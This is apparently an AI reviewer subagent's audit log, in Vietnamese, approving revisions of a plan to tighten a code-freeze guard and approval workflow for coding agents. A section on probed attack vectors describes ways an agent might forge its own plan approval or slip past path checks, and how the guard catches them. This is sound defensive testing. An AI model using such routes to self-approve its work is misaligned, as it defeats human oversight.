4. **`MAJ-03`**: Sửa hướng dẫn cập nhật `.agents/agents/reviewer/evidence-bar.md` §4.5.3 để tránh mâu thuẫn giữa Baseline check (`npx tsc --noEmit`) và Negative Probe (`npx vitest run <path>` với test case dữ liệu vi phạm); bổ sung `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` và `docs/plans/README.md` vào Mục 5 (`[MODIFY]`) và quy định rõ thứ tự đóng trạng thái `Status: Completed` ở cuối Bước 5.
5. **`MIN-01`**: Đồng bộ số phiên bản và số dòng của `package.json` (`vitest ^4.1.12`, `eslint ^9.39.2`, `node 24.x`) và tiêu đề mục đầu `docs/CHANGELOG.md` tại Mục 3.2 và Mục 4.

[CHANGES_REQUESTED]

---

### Audit Run 2

[REVIEWER_MODEL: gemini-4-argon]

- **Reviewer**: Subagent `@reviewer` (`gemini-4-argon`, thinking budget Max)
- **Ngày**: 2026-10-19
- **Đối tượng thẩm định**: Revision 2 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[PLAN_APPROVED]` (0 `[BLOCKER]`, 0 `[MAJOR]`, 1 `[MINOR]`)

---

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 1)

| Mã Lỗi       |   Mức Độ    | Trạng Thái | Bằng Chứng Kiểm Chứng Trên Bản Kế Hoạch (Revision 2) & Mã Nguồn (`[SRC]` / `[CMD]`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| :----------- | :---------: | :--------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`BLK-01`** | `[BLOCKER]` | **ĐÃ SỬA** | • **Hằng số `UNFROZEN_PREFIXES` & `UNFROZEN_FILES`**: Mục 6.2 (dòng 261–263) và Bước 4.4 (dòng 426) đã giữ nguyên biểu thức `const unfrozen = UNFROZEN_PREFIXES.some((prefix) => relative.startsWith(prefix)) \|\| UNFROZEN_FILES.includes(relative);`, khớp với `[SRC]` `.agents/scripts/code-freeze-guard.js:39-42,465-467` và bảo toàn test tại `.agents/scripts/code-freeze-guard.test.ts:115-117`.<br>• **Chữ ký `decide(input, options)`**: Mục 6.3 (dòng 326–350), Bước 4 (dòng 429), Mục 8 (`TC-04`..`TC-07`) và Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`) đã chuyển sang truyền `{ toolName, targetFile, newContent }` và `{ planApproved: false }`, khớp với kiểu `GuardInput` và `DecideOptions` tại `[SRC]` `.agents/scripts/code-freeze-guard.js:28-29,437`.<br>• **Chuẩn ES Modules**: Mục 4 (dòng 138), Mục 6.1 (dòng 205, 238) và Bước 4.2 (dòng 424) đã dùng cú pháp `export function evaluatePlanApprovalContent(content)` và `export function isSelfForgedPlanWrite(newContent)`, đồng bộ biểu thức chính quy Header `/^(?:-\s*)?\*\*(?:Status\|Trạng thái)\*\*:\s*Approved\s*$/im`. |
| **`MAJ-01`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 2.1 (dòng 84), Mục 3.1.4 (dòng 111–115), Mục 8 (`TC-08`, `TC-09`) và Mục 10 (`Risk 5` dòng 514) đã phân biệt đúng cổng `[4/5]` (Character Limits tại `[SRC]` `scripts/verify-docs.mjs:197-231`) và cổng `[5/5]` (CHANGELOG Size `< 35,000 bytes` & Headings Integrity tại `[SRC]` `scripts/verify-docs.mjs:233-296`).<br>• Chuỗi kết quả đầu ra trong `TC-09` (dòng 466) đã sửa thành `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<` khớp với `[SRC]` `scripts/verify-docs.mjs:301`.<br>• Đã bổ sung cập nhật dòng ghi chú mốc ngày lưu trữ tại `docs/CHANGELOG.md:7` và `docs/archive/CHANGELOG-legacy.md:3` từ `2026-09-10` sang `2026-10-15` (Mục 1.1 dòng 48, Mục 5 `#23`–`#24`, Bước 5 dòng 444).                                                                                                                                                                                                                                                                                                                                                                                          |
| **`MAJ-02`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 2.1 (dòng 67), Mục 5 (`#8` dòng 161), Bước 3 (dòng 393–398) và Mục 10 (`Risk 3` dòng 512) đã liệt kê đủ 5 vị trí tham chiếu `.agents/workflows/` trong `[SRC]` `.agents/rules/02-quality.md:19,30,41,99,140`.<br>• Mục 1.1 (dòng 43–44), Mục 5 (`#16`, `#17` dòng 169–170) và Bước 5 (dòng 439–440) đã bổ sung sửa `lib/core/modelRegistry.ts` thành `src/lib/core/modelRegistry.ts` tại `[SRC]` `.agents/skills/add-model/SKILL.md:12,28` (cùng dòng 37) và sửa `lib/utils/translations/` thành `src/lib/utils/translations/` tại `[SRC]` `.agents/skills/add-translation/SKILL.md:12,25,31`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **`MAJ-03`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 5 (`#5` dòng 158) và Bước 2 (dòng 377) đã tách bạch công cụ kiểm chứng Wiring & Baseline (`npx eslint --print-config <path>`, `npx tsc --showConfig`, `npx tsc --noEmit`) với Negative Probe (chạy test case âm tính truyền dữ liệu/command vi phạm trong `*.test.ts` qua `npx vitest run <path>`), không còn mâu thuẫn với `[SRC]` `.agents/agents/reviewer/evidence-bar.md:50`.<br>• Đã tách riêng `docs/CHANGELOG.md` (`#23`), `docs/archive/CHANGELOG-legacy.md` (`#24`), `docs/plans/README.md` (`#25`) và `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` (`#26`) trong Mục 5, đồng thời quy định thứ tự cập nhật `Status: Completed` ở cuối Bước 5 (dòng 123, 447–450, 513).                                                                                                                                                                                                                                                                                                                                                                                                        |
| **`MIN-01`** |  `[MINOR]`  | **ĐÃ SỬA** | • Mục 3.2 (dòng 122) và Mục 4 (dòng 135–138) đã cập nhật khớp với `[SRC]` `package.json:101,115,117,120` (`vitest ^4.1.12`, `typescript ^5.9.3`, `eslint ^9.39.2`, `node 24.x`) và `docs/CHANGELOG.md:11-19`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

---

#### 2. Phát Hiện Mới (New Findings)

##### `[MINOR]` `MIN-02`: Số lượng heading `## ` thực tế trên đĩa của `docs/CHANGELOG.md` + `docs/archive/CHANGELOG-legacy.md` là 112 (sau khi thêm mục mới là 113, thay vì 103)

- **Vị trí trong kế hoạch**: Mục 1.1 (dòng 48), Mục 2.1 (dòng 85), Mục 3.1.4 (dòng 115), Bước 5 (dòng 445–446), Mục 8 (`TC-07`, `TC-09` dòng 464, 466), Mục 9.2 (dòng 482), Mục 10 (`Risk 5` dòng 514).
- **Bằng chứng trên mã nguồn thật (`[SRC]`)**:
  - Qua kiểm đếm trực tiếp toàn bộ `[SRC]` `docs/CHANGELOG.md:1-847`, file hiện có **38** dòng bắt đầu bằng `## ` (gồm 6 mục từ `2026-10-16` đến `2026-10-19` tại các dòng 11, 22, 37, 56, 77, 99 sẽ giữ lại ở `docs/CHANGELOG.md`, và 32 mục từ `2026-09-10` đến `2026-10-15` tại các dòng 123–827 sẽ chuyển sang archive).
  - Kết hợp với **74** dòng bắt đầu bằng `## ` trong `[SRC]` `docs/archive/CHANGELOG-legacy.md:1-1503`, tổng số heading hiện tại trên đĩa là `38 + 74 = 112`.
  - Sau khi di chuyển 32 mục cũ sang `docs/archive/CHANGELOG-legacy.md` và thêm 1 mục mới của task Governance 2.0 vào đầu `docs/CHANGELOG.md`, số lượng heading sẽ là `7` (current) + `106` (legacy) = **`113`** tổng cộng.
- **Lưu ý khi triển khai (không chặn phê duyệt)**:
  - Khi chạy lệnh kiểm định ở Bước 5 và `TC-09`, truyền `--expected-headings=113` (`node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113`) để khớp với phép so sánh bằng `totalHeadings !== expectedHeadings` tại `[SRC]` `scripts/verify-docs.mjs:274`. (Biểu thức chính quy `/^node scripts\/verify-docs\.mjs(?:\s+(?:--strict-shorthand|--expected-headings=\d+))*$/` trong `code-freeze-guard.js` chấp nhận mọi số nguyên `\d+`, nên không ảnh hưởng tới logic code).

---

#### 3. Plan Completeness Gate & Mental Simulation Verification Matrix

##### 3.1. Plan Completeness Gate (7 Hạng Mục Bắt Buộc)

|  #  | Hạng Mục Cấu Trúc                               | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng                                                                                                                                                         |
| :-: | :---------------------------------------------- | :--------: | :---------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | **Bảng Verified Versions (2026)**               |   `PASS`   | `[SRC]` / `[URL]` | Mục 4 (dòng 127–139) khớp với `[URL]` tài liệu Google Antigravity 2026 và `[SRC]` `package.json:101,115,117,120`, `.agents/scripts/code-freeze-guard.js:21-25`.             |
|  2  | **Checklist `[NEW]` / `[MODIFY]` / `[DELETE]`** |   `PASS`   |      `[SRC]`      | Mục 5 (dòng 142–180) liệt kê đầy đủ 2 file `[NEW]`, 3 file `[DELETE]`, và 26 file `[MODIFY]` tách biệt rõ ràng.                                                             |
|  3  | **Verification Plan & Probes**                  |   `PASS`   | `[SRC]` / `[CMD]` | Mục 9 (dòng 470–503) định nghĩa rõ file test co-located, danh sách lệnh verify, 2 Wiring Probes và 4 Negative Probes đúng chữ ký hàm `decide()`.                            |
|  4  | **Test Contract**                               |   `PASS`   |      `[SRC]`      | Mục 8 (dòng 454–467) bao phủ `TC-01`..`TC-09` với đầy đủ input, expected output và điều kiện biên (Boundary / Negative cases).                                              |
|  5  | **Assumptions & Cross-Task Dependencies**       |   `PASS`   | `[SRC]` / `[CMD]` | Mục 3 (dòng 99–124) kiểm chứng đầy đủ 4 giả định kỹ thuật và quy trình kiểm soát thứ tự `mtimeMs` với các file chưa commit từ task trước.                                   |
|  6  | **Out of Scope (`What We're NOT Doing`)**       |   `PASS`   |      `[SRC]`      | Mục 1.2 (dòng 50–56) giới hạn rõ phạm vi, không chạm vào mã nguồn runtime trong `src/`.                                                                                     |
|  7  | **Skills Loaded & Applied**                     |   `PASS`   |      `[SRC]`      | Mục 2.2 (dòng 87–96) đối chiếu 5 skills (`vikini-investigate`, `vikini-simplify`, `api-patterns`, `add-model`, `add-translation`) với các quyết định cụ thể trong kế hoạch. |

##### 3.2. Mental Simulation Verification Matrix (S1–S6 + Domain)

| Kịch Bản                                         | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng Độc Lập                                                                                                                                                                                                                                                                                                                                     |
| :----------------------------------------------- | :--------: | :---------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **S1: Cold-start & Build**                       |   `PASS`   | `[CMD]` / `[SRC]` | Đã chạy `[CMD]` `npm run type-check` (`exit 0`), `npm run lint` (`exit 0`), `npx vitest run .agents/scripts/code-freeze-guard.test.ts` (`92/92 passed`). Code sketch tại Mục 6.1–6.3 sử dụng đúng JSDoc typing (`@param {string \| undefined}`) và chữ ký `decide(input, options)` tương thích với `// @ts-check` tại `.agents/scripts/code-freeze-guard.js:1`. |
| **S2: Runner Lifecycle & Teardown**              |   `PASS`   |      `[SRC]`      | Không thay đổi kết nối DB/Redis hay SSE stream. Hai hàm mới `evaluatePlanApprovalContent` và `isSelfForgedPlanWrite` là hàm thuần (pure functions) hoạt động trên chuỗi trong bộ nhớ, không tạo file tạm khi chạy test.                                                                                                                                         |
| **S3: Database & Temporal Logic**                |   `PASS`   | `[SRC]` / `[ADV]` | Rủi ro thứ tự thời gian `mtimeMs` của `isPlanApproved()` (`.agents/scripts/code-freeze-guard.js:201-205`) đã được kiểm soát bằng quy trình cập nhật `Status: Completed` theo thứ tự nghiêm ngặt ở cuối Bước 5 (dòng 447–450).                                                                                                                                   |
| **S4: Cross-Task State Flow**                    |   `PASS`   | `[CMD]` / `[SRC]` | Đã đối chiếu `[CMD]` `git status` và `[SRC]` `.agents/skills/add-model/SKILL.md:12,28,37`, `.agents/skills/README.md`, `.gitignore`, `docs/CHANGELOG.md:11-19`. Kế hoạch nối tiếp trực tiếp trạng thái working tree hiện tại mà không ghi đè mất thay đổi của task trước.                                                                                       |
| **S5: Security Boundary & Guard Enforcement**    |   `PASS`   | `[SRC]` / `[ADV]` | Whitelist trạng thái `Status: Approved` kết hợp khớp chính xác `trimmed === "[PLAN_APPROVED]"`, Self-Forgery Guard tại Gate 3 cho `write_to_file`, thu hẹp regex `claude` trong `READ_ONLY_COMMANDS`, và bổ sung `multi_replace_file_content` vào `.agents/hooks.json` đều có technical control và unit test tương ứng (`TC-01`..`TC-07`).                      |
| **S6: External Resilience & Serverless Cap**     |   `PASS`   |      `[SRC]`      | Không chạm tới API routes hay serverless timeouts. Hook `PreToolUse` giữ nguyên cơ chế fail-closed trong khối `try / catch` tại `.agents/scripts/code-freeze-guard.js:709-718`.                                                                                                                                                                                 |
| **Domain: Vikini Governance 2.0 & Verification** |   `PASS`   | `[SRC]` / `[URL]` | Schema YAML frontmatter của Subagents (`model: pro`, bỏ `role:`) và Rules (`trigger: glob`, `globs: "*.ts, ..."`) tuân thủ tài liệu Google Antigravity 2026; toàn bộ 5 vị trí `.agents/workflows/` trong `02-quality.md` và các đường dẫn thiếu `src/` trong skills đã được đưa vào danh mục sửa chữa.                                                          |

---

#### 4. Các Tấn Công Đã Thử (Attack Vectors Probed)

1. **Tấn công 1 — Bypass Self-Forgery Guard qua biến thể đường dẫn Windows backslash (`"docs\\plans\\fake.md"`) hoặc ghi vào `"docs/plans"`**:
   - **Cách thử**: Lần theo luồng chuẩn hóa đường dẫn trong `[SRC]` `.agents/scripts/code-freeze-guard.js:94-113,452` (`const relative = toRepoRelative(input.targetFile)` gọi `toPosix()` đổi toàn bộ `\` thành `/`) trước khi tới Gate 3 (Mục 6.2 dòng 267–275).
   - **Kết quả**: Mọi biến thể đường dẫn tương đối hoặc tuyệt đối trỏ vào `docs/plans/*.md` trên Windows đều được chuẩn hóa về `relative = "docs/plans/..."` trước Gate 3. Điều kiện `(relative === "docs/plans" || relative.startsWith("docs/plans/")) && input.toolName === "write_to_file" && isSelfForgedPlanWrite(input.newContent)` bắt được cả hai trường hợp và trả về `ask(...)`.
2. **Tấn công 2 — Gây chặn nhầm (False Positive) khi Planner dùng `write_to_file` tạo bản kế hoạch hợp lệ có bàn luận về chuỗi `[PLAN_APPROVED]` hoặc `Status: Approved` trong thân bài**:
   - **Cách thử**: Kiểm tra logic `isSelfForgedPlanWrite(newContent)` tại Mục 6.1 (dòng 238–254) với đầu vào là chính nội dung file kế hoạch Governance 2.0 (có `- **Status**: Ready for Review` ở dòng 4, và có nhiều dòng trong phần `## Technical Plan` chứa chuỗi `[PLAN_APPROVED]` hoặc `Status: Approved`).
   - **Kết quả**: Biểu thức `/^(?:-\s*)?\*\*(?:Status|Trạng thái)\*\*:\s*Approved\s*$/im` chỉ kiểm tra trên `lines.slice(0, 30)` và neo cả đầu dòng (`^`) lẫn cuối dòng (`$`), nên các câu văn mô tả trong thân bài hoặc dòng `- **Status**: Ready for Review` ở dòng 4 không khớp; vòng lặp thứ hai chỉ kiểm tra dòng không rỗng cuối cùng (`trimmed === "[PLAN_APPROVED]"`). Kế hoạch hợp lệ đi qua Gate 3 với `{ decision: "allow" }` (`TC-04` boundary).
3. **Tấn công 3 — Truy quét tham chiếu `.agents/workflows/` ẩn trong toàn bộ các file Markdown active làm gãy Gate `[1/5]` hoặc `[2/5]` của `scripts/verify-docs.mjs` sau khi xóa thư mục `.agents/workflows/`**:
   - **Cách thử**: Đối chiếu danh sách file quét của `[SRC]` `scripts/verify-docs.mjs:37-42,115-131` với nội dung thực tế của `.agents/rules/00..05-*.md`, `.agents/agents/{planner,reviewer,qa}/agent.md`, `.agents/README.md`, `.agents/skills/README.md`, `.agents/scripts/claude-planner-prompt.md`, `.agents/scripts/claude-reviewer-prompt.md`, `docs/README.md`, `docs/architecture.md`, `docs/lessons-learned.md`.
   - **Kết quả**: Xác nhận không còn tham chiếu `.agents/workflows/` nào nằm ngoài các vị trí đã liệt kê trong Bước 1–5 (5 vị trí ở `02-quality.md:19,30,41,99,140`, 1 vị trí ở `planner/agent.md:57`, 1 vị trí ở `claude-planner-prompt.md:64`); đồng thời Gate `[2/5]` trong Bước 5 (dòng 436) đã bổ sung điều kiện `if (rel.startsWith("docs/plans/") && rel !== "docs/plans/README.md") continue;` để không báo lỗi giả trên các bản kế hoạch lịch sử.
4. **Tấn công 4 — Phá vỡ các unit test hiện hữu trong `.agents/scripts/code-freeze-guard.test.ts` khi siết chặt regex `claude` và thay đổi `isPlanApproved()`**:
   - **Cách thử**: Kiểm tra toàn bộ 92 test cases trong `[SRC]` `.agents/scripts/code-freeze-guard.test.ts:1-987` (đặc biệt là cụm test `allows Claude CLI and run-claude script execution` tại dòng 274–284 và `SW-G1..SW-G8` tại dòng 910–986) kết hợp chạy `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts`.
   - **Kết quả**: Hai lệnh `claude` trong test hiện hữu là `"claude -p ping"` và `"claude.exe --version"` đều khớp với biểu thức chính quy mới `/^claude(?:\.exe)?\s+(?:--version|-v|--help|-h|-p\s+["']?ping["']?)$/i`, trong khi các lệnh gọi qua wrapper `powershell ... -File .agents/scripts/run-claude.ps1` đi qua regex dòng 63 và giữ nguyên trạng thái pass.

---

#### 5. Commands Executed (Trong ALLOWLIST)

1. `npm run type-check` ➔ **Exit code 0** (`tsc --noEmit` không có lỗi).
2. `npx vitest run .agents/scripts/code-freeze-guard.test.ts` ➔ **Exit code 0** (`1 passed`, `92/92 tests passed`).
3. `git status` ➔ **Exit code 0** (xác nhận trạng thái working tree hiện tại).
4. `npm run lint` ➔ **Exit code 0** (`eslint .` không có lỗi).

---

#### 6. Kết Luận Phê Duyệt

Bản kế hoạch **Revision 2** đã giải quyết đầy đủ các điểm nghẽn từ Audit Run 1 (`BLK-01`, `MAJ-01`, `MAJ-02`, `MAJ-03`, `MIN-01`), có thiết kế kiểm thử và phương án phòng ngừa rủi ro rõ ràng. Khi thực thi Bước 5, lưu ý áp dụng ghi chú `MIN-02` (`--expected-headings=113`). Kế hoạch đạt chuẩn phê duyệt để chuyển sang giai đoạn triển khai.

---

### Audit Run 3

[REVIEWER_MODEL: gemini-4-argon]

- **Reviewer**: Subagent `@reviewer` (`gemini-4-argon`, thinking budget Max)
- **Ngày**: 2026-10-19
- **Đối tượng thẩm định**: Revision 3 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[PLAN_APPROVED]` (0 `[BLOCKER]`, 0 `[MAJOR]`, 0 `[MINOR]`)

---

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 1 & Audit Run 2)

| Mã Lỗi       |   Mức Độ    | Trạng Thái | Bằng Chứng Kiểm Chứng Trên Bản Kế Hoạch (Revision 3) & Mã Nguồn (`[SRC]` / `[CMD]`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| :----------- | :---------: | :--------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`BLK-01`** | `[BLOCKER]` | **ĐÃ SỬA** | • **Hằng số `UNFROZEN_PREFIXES` & `UNFROZEN_FILES`**: Mục 6.2 (dòng 275–277) và Bước 4.4 (dòng 438) giữ nguyên biểu thức `const unfrozen = UNFROZEN_PREFIXES.some((prefix) => relative.startsWith(prefix)) \|\| UNFROZEN_FILES.includes(relative);`, khớp với `[SRC]` `.agents/scripts/code-freeze-guard.js:39-42,465-467` và test tại `.agents/scripts/code-freeze-guard.test.ts:115-117`.<br>• **Chữ ký `decide(input, options)`**: Mục 6.3 (dòng 340–364), Bước 4 (dòng 441), Mục 8 (`TC-04`..`TC-07`, dòng 475–478) và Mục 9.3 (`Negative Probe 3`, `Negative Probe 4`, dòng 515–517) sử dụng `{ toolName, targetFile, newContent }` và `{ planApproved: false }`, khớp với `GuardInput` và `DecideOptions` tại `[SRC]` `.agents/scripts/code-freeze-guard.js:28-29,437`.<br>• **Chuẩn ES Modules**: Mục 4 (dòng 145), Mục 6.1 (dòng 219, 252) và Bước 4.2 (dòng 436) sử dụng `export function evaluatePlanApprovalContent(content)` và `export function isSelfForgedPlanWrite(newContent)`. |
| **`MAJ-01`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 2.1 (dòng 91), Mục 3.1.4 (dòng 118–123), Mục 8 (`TC-08`, `TC-09`, dòng 479–480) và Mục 10 (`Risk 5`, dòng 529) phân biệt đúng cổng `[4/5]` (`scripts/verify-docs.mjs:197-231`) và cổng `[5/5]` (`scripts/verify-docs.mjs:233-296`), khớp chuỗi đầu ra `>>> ALL DOCUMENTATION VERIFICATION CHECKS PASSED. <<<` (`scripts/verify-docs.mjs:301`) và cập nhật mốc lưu trữ `2026-09-10` ➔ `2026-10-15` tại `docs/CHANGELOG.md:7` & `docs/archive/CHANGELOG-legacy.md:3` (dòng 55, 187–188, 458).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **`MAJ-02`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 2.1 (dòng 73), Mục 5 (`#8`, dòng 172), Bước 3 (dòng 405–410) và Mục 10 (`Risk 3`, dòng 527) liệt kê đủ 5 vị trí `.agents/workflows/` trong `[SRC]` `.agents/rules/02-quality.md:19,30,41,99,140`.<br>• Mục 1.1 (dòng 50–51), Mục 5 (`#16`, `#17`, dòng 180–181) và Bước 5 (dòng 451–452) bao phủ các vị trí thiếu tiền tố `src/` trong `[SRC]` `.agents/skills/add-model/SKILL.md:12,28,37` và `.agents/skills/add-translation/SKILL.md:12,25,31`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **`MAJ-03`** |  `[MAJOR]`  | **ĐÃ SỬA** | • Mục 5 (`#5`, dòng 169) và Bước 2 (dòng 388) phân định rõ công cụ kiểm chứng Wiring & Baseline (`npx eslint --print-config <path>`, `npx tsc --showConfig`, `npx tsc --noEmit`) với Negative Probe (`npx vitest run <path>` với test case âm tính), phù hợp với `[SRC]` `.agents/agents/reviewer/evidence-bar.md:50`.<br>• Mục 5 liệt kê tách biệt `#23`–`#26` (dòng 187–190) và Bước 5 (dòng 131, 461–464, 528) quy định thứ tự cập nhật `Status: Completed` ở cuối quy trình để tránh khóa `isPlanApproved()` sớm.                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **`MIN-01`** |  `[MINOR]`  | **ĐÃ SỬA** | • Mục 3.2 (dòng 130) và Mục 4 (dòng 142–145) khớp với `[SRC]` `package.json:101,115,117,120` (`vitest ^4.1.12`, `typescript ^5.9.3`, `eslint ^9.39.2`, `node 24.x`) và `docs/CHANGELOG.md:11-19`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **`MIN-02`** |  `[MINOR]`  | **ĐÃ SỬA** | • Mục 1.1 (dòng 55), Mục 2.1 (dòng 92), Mục 3.1.4 (dòng 123), Bước 5 (dòng 459–460), Mục 8 (`TC-07`, `TC-09`, dòng 478, 480), Mục 9.2 (dòng 496) và Mục 10 (`Risk 5`, dòng 529) đã cập nhật số lượng heading `## ` khớp với thực tế trên đĩa (`[SRC]` `docs/CHANGELOG.md:1-847` có `38` + `docs/archive/CHANGELOG-legacy.md:1-1503` có `74` = `112` hiện tại + `1` mục mới = `113` tổng cộng: `7` current + `106` legacy) và truyền `--expected-headings=113`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |

---

#### 2. Phát Hiện Mới (New Findings)

- Không phát hiện lỗi `[BLOCKER]`, `[MAJOR]`, hoặc `[MINOR]` mới trong bản kế hoạch **Revision 3**.
- Các nội dung cập nhật mới tại Revision 3 (đồng bộ danh mục 4 model tháng 10/2026 trên `.agents/agents/qa/agent.md`, `.agents/rules/01-coding.md`, `.agents/README.md` và bỏ bước tự đọc lại `.agents/rules/02-quality.md` tại `.agents/agents/planner/agent.md:30` theo Antigravity `v2.19.1`) đều khớp với tài liệu trực tuyến `[URL]` và mã nguồn thực tế `[SRC]`.

---

#### 3. Plan Completeness Gate & Mental Simulation Verification Matrix

##### 3.1. Plan Completeness Gate (7 Hạng Mục Bắt Buộc)

|  #  | Hạng Mục Cấu Trúc                               | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng                                                                                                                                                                                                |
| :-: | :---------------------------------------------- | :--------: | :---------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | **Bảng Verified Versions (2026)**               |   `PASS`   | `[SRC]` / `[URL]` | Mục 4 (dòng 133–150) đối chiếu đầy đủ `[URL]` `https://antigravity.google/docs/models.md`, `subagents.md`, `rules.md`, `hooks.md`, `changelog.md` (`v2.19.1`–`v2.24.0`) và `[SRC]` `package.json:101,115,117,120`. |
|  2  | **Checklist `[NEW]` / `[MODIFY]` / `[DELETE]`** |   `PASS`   |      `[SRC]`      | Mục 5 (dòng 153–191) liệt kê rõ 2 file `[NEW]`, 3 file `[DELETE]`, và 26 file `[MODIFY]`.                                                                                                                          |
|  3  | **Verification Plan & Probes**                  |   `PASS`   | `[SRC]` / `[CMD]` | Mục 9 (dòng 484–518) định nghĩa file test co-located, danh sách lệnh verify (`--expected-headings=113`), 2 Wiring Probes (bao gồm kiểm tra model roster tháng 10/2026) và 4 Negative Probes.                       |
|  4  | **Test Contract**                               |   `PASS`   |      `[SRC]`      | Mục 8 (dòng 468–481) định nghĩa `TC-01`..`TC-09` kèm điều kiện biên và kiểm tra không còn chuỗi `claude-4.6-opus` hay `Gemini 3.1 Pro` trong `.agents/` (`TC-08`).                                                 |
|  5  | **Assumptions & Cross-Task Dependencies**       |   `PASS`   | `[SRC]` / `[URL]` | Mục 3 (dòng 105–132) kiểm chứng 4 giả định kỹ thuật (kể cả cơ chế kế thừa rules của custom subagents từ `v2.19.1` và model roster `v2.24.0`) cùng phụ thuộc chéo với task trước.                                   |
|  6  | **Out of Scope (`What We're NOT Doing`)**       |   `PASS`   |      `[SRC]`      | Mục 1.2 (dòng 57–63) giữ nguyên phạm vi cô lập, không can thiệp runtime `src/`.                                                                                                                                    |
|  7  | **Skills Loaded & Applied**                     |   `PASS`   |      `[SRC]`      | Mục 2.2 (dòng 94–103) ánh xạ 5 skills (`vikini-investigate`, `vikini-simplify`, `api-patterns`, `add-model`, `add-translation`) vào thiết kế kỹ thuật.                                                             |

##### 3.2. Mental Simulation Verification Matrix (S1–S6 + Domain)

| Kịch Bản                                         | Trạng Thái |  Loại Bằng Chứng  | Chi Tiết Kiểm Chứng Độc Lập                                                                                                                                                                                                                                                                                                                                                       |
| :----------------------------------------------- | :--------: | :---------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **S1: Cold-start & Build**                       |   `PASS`   | `[CMD]` / `[SRC]` | `[CMD]` `npm run type-check` (`exit 0`), `npm run lint` (`exit 0`), `npx vitest run .agents/scripts/code-freeze-guard.test.ts` (`92/92 passed`). Code sketch tại Mục 6.1–6.3 tương thích với `// @ts-check` của `.agents/scripts/code-freeze-guard.js:1`.                                                                                                                         |
| **S2: Runner Lifecycle & Teardown**              |   `PASS`   |      `[SRC]`      | Không thay đổi kết nối mạng hay tiến trình nền. Hai hàm `evaluatePlanApprovalContent` và `isSelfForgedPlanWrite` là hàm thuần không sinh file phụ.                                                                                                                                                                                                                                |
| **S3: Database & Temporal Logic**                |   `PASS`   | `[SRC]` / `[ADV]` | Thứ tự thời gian `mtimeMs` trong `isPlanApproved()` (`.agents/scripts/code-freeze-guard.js:201-205`) được kiểm soát qua quy trình khóa trạng thái `Completed` ở cuối Bước 5 (dòng 461–464).                                                                                                                                                                                       |
| **S4: Cross-Task State Flow**                    |   `PASS`   | `[CMD]` / `[SRC]` | Kế hoạch bảo toàn các thay đổi chưa commit từ task trước (`[CMD]` `git status`) và sửa tiếp lỗi đường dẫn thiếu `src/` trong `.agents/skills/add-model/SKILL.md:12,28,37`.                                                                                                                                                                                                        |
| **S5: Security Boundary & Guard Enforcement**    |   `PASS`   | `[SRC]` / `[ADV]` | Kết hợp kiểm tra `- **Status**: Approved` ở 30 dòng đầu + dòng cuối `=== "[PLAN_APPROVED]"`, chặn tự cấp quyền qua `write_to_file` tại Gate 3, thu hẹp regex `claude` trong `READ_ONLY_COMMANDS`, và thêm `multi_replace_file_content` vào `.agents/hooks.json`.                                                                                                                  |
| **S6: External Resilience & Serverless Cap**     |   `PASS`   |      `[SRC]`      | Không chạm vào API routes. Hook `PreToolUse` duy trì `"timeout": 5` và cơ chế fail-closed tại `.agents/scripts/code-freeze-guard.js:709-718`.                                                                                                                                                                                                                                     |
